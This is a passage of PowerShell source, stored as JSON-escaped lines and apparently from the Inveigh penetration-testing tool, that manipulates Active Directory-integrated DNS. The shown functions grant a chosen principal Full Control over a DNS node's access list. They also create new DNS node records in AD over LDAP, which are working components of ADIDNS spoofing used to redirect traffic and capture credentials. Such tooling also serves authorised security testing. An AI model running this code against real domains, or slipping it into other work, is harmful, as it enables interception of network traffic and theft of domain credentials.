$Partition\"","        }","        else","        {","            $distinguished_name = \"DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition\"","        }","","        $DC_array = $Domain.Split(\".\")","","        ForEach($DC in $DC_array)","        {","            $distinguished_name += \",DC=$DC\"","        }","","        if($Credential)","        {","            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$DomainController/$distinguished_name\",$Credential.UserName,$Credential.GetNetworkCredential().Password)","        }","        else","        {","            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry \"LDAP://$DomainController/$distinguished_name\"","        }","","        try","        {","            $NT_account = New-Object System.Security.Principal.NTAccount($Principal)","            $principal_SID = $NT_account.Translate([System.Security.Principal.SecurityIdentifier])","            $principal_identity = [System.Security.Principal.IdentityReference]$principal_SID","            $AD_rights = [System.DirectoryServices.ActiveDirectoryRights]$Access","            $access_control_type = [System.Security.AccessControl.AccessControlType]$Type","            $AD_security_inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]\"All\"","            $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($principal_identity,$AD_rights,$access_control_type,$AD_security_inheritance)","        }","        catch","        {","            $error_message = $_.Exception.Message","            $error_message = $error_message -replace \"`n\",\"\"","            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") \u003e $null","        }","","        try","        {","            $directory_entry.psbase.ObjectSecurity.AddAccessRule($ACE)","            $directory_entry.psbase.CommitChanges()","            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Full Control ACE added for $Principal to $Node DACL\") \u003e $null","        }","        catch","        {","            $error_message = $_.Exception.Message","            $error_message = $error_message -replace \"`n\",\"\"","            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") \u003e $null","        }","","        if($directory_entry.Path)","        {","            $directory_entry.Close()","        }","","        return $output","    }","    ","    function New-ADIDNSNode","    {","        [CmdletBinding()]","        param","        (","            [parameter(Mandatory=$false)][String]$Data,    ","            [parameter(Mandatory=$false)][String]$DistinguishedName,","            [parameter(Mandatory=$false)][String]$Domain,","            [parameter(Mandatory=$false)][String]$DomainController,","            [parameter(Mandatory=$false)][String]$Forest,","            [parameter(Mandatory=$true)][String]$Node,","            [parameter(Mandatory=$false)][ValidateSet(\"DomainDNSZones\",\"ForestDNSZones\")][String]$Partition = \"DomainDNSZones\",","            [parameter(Mandatory=$false)][String]$Type,","            [parameter(Mandatory=$false)][String]$Zone,","            [parameter(Mandatory=$false)][Int]$TTL,","            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential","        )","","        $null = [System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\")","","        $distinguished_name = \"DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition\"","        $DC_array = $Domain.Split(\".\")","","        foreach($DC in $DC_array)","        {","            $distinguished_name += \",DC=$DC\"","        }","","        [Byte[]]$DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Type $Type -TTL $TTL -Zone $Zone","        $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DomainController,389)","","        if($Credential)","        {","            $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier,$Credential.GetNetworkCredential())","        }","        else","        {","            $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)","        }","","        $object_category = \"CN=Dns-Node,CN=Schema,CN=Configuration\"","        $forest_array = $Forest.Split(\".\")","","        foreach($DC in $forest_array)","        {","            $object_category += \",DC=$DC\"","        }","        ","        try","        {","            $connection.SessionOptions.Sealing = $true","            $connection.SessionOptions.Signing = $true","            $connection.Bind()","            $request = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest","            $request.DistinguishedName = $distinguished_name","            $request.Attributes.Add((New-Object \"System.DirectoryServices.Protocols.DirectoryAttribute\" -ArgumentList \"objectClass\",@(\"top\",\"dnsNode\"))) \u003e $null","            $request.Attributes.Add((New-Object \"System.DirectoryServices.Protocols.DirectoryAttribute\" -ArgumentList \"objectCategory\",$object_category)) \u003e $null","            $request.Attributes.Add((New-Object \"System.DirectoryServices.Protocols.DirectoryAttribute\" -ArgumentList \"dnsRecord\",$DNSRecord)) \u003e $null","            $request.Attributes.Add((New-Object \"System.DirectoryServices.Protocols.DirectoryAttribute\" -ArgumentList \"dNSTombstoned\",\"TRUE\")) \u003e $null","            $connection.SendRequest($request) \u003e $null","            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] ADIDNS node $Node type $Type added to $Zone\") \u003e $null","            $output = $true","            $inveigh.ADIDNS_table.$Node = \"1\"","        }","        catch","        {","            $error_message = $_.Exception.Message","            $error